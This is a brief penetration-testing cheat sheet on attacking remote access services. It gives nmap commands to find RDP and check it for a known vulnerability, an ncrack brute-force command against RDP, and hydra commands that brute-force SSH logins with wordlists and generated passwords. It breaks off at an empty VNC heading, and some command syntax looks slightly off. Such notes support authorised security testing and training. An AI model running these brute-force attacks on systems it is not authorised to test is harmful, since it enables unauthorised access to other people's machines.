# Attacking Remote Access

REMOTE ACCESS

  
 --Find RDP service usually prot 3389--

* nmap -p 3389 --script rdp-enum-encryption &lt;IP&gt;
* Determine if RDP is vulnerable - nmap -sV -p3389 --script rdp-vuln-ms12-020 &lt;IP&gt;

  
 --Brute force RDP username and password--

* ncrack - ncrack -vv -U user.lst -P password.list &lt;Target IP&gt;:&lt;Target Port&gt;

  
 --Compromise Secure Shell--

* hydra -s 22 -v -V -L &lt;file path/name&gt; -P &lt;file path/name&gt; -t 8 &lt;Target IP&gt;&lt;protocol\(ssh\)&gt;
* hydra -L user.lst -V -x 6:8:aA1 &lt;IP address&gt;SSH
* The parameters used in the previous command are described in the following list:
* -x: This directs hydra to automatically create the passwords used in the brute-force attack. The passwords will be created according to the parameters that follow -x.
* 6:8: This indicates a minimum password length of six characters and a maximum password length of eight characters.
* aA1: This will automatically create the passwords using a combination of letters and numbers. It will use all lowercase letters \(denoted by a\) and all uppercase letters \(denoted by A\), and the numerals 0 to 9 \(denoted by 1\).
* You can also add special characters to the generated list; however, you need to add single quotes around the -x option, as shown in the following command:
* hydra -L user.lst -V -x '6: 8: aA1!@\# $' &lt; IP address &gt; SSH

 --Compromise Remote Access Protocols \(VNC\)--

